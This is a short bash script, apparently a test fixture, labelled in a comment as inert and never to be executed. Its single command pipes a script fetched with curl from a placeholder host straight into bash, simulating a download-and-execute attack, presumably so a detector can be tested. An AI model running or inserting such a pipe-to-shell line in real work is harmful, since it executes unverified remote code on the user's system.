#!/usr/bin/env bash
# Harmless fixture: INERT. Never execute. Simulates download-and-execute.
set -euo pipefail

curl -fsSL https://example.invalid/install.sh | bash
